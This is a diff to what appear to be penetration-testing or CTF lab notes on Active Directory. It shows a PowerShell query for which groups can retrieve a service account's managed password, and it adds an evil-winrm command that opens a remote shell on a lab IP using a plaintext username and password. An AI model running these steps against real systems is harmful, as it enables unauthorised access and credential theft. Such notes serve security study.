@@ -33,4 +33,7 @@ What groups have permission to acheive a users password:
 ```
 Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
 ```
-
+Winrm command to give access to our folder to run files:
+```
+evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
+```
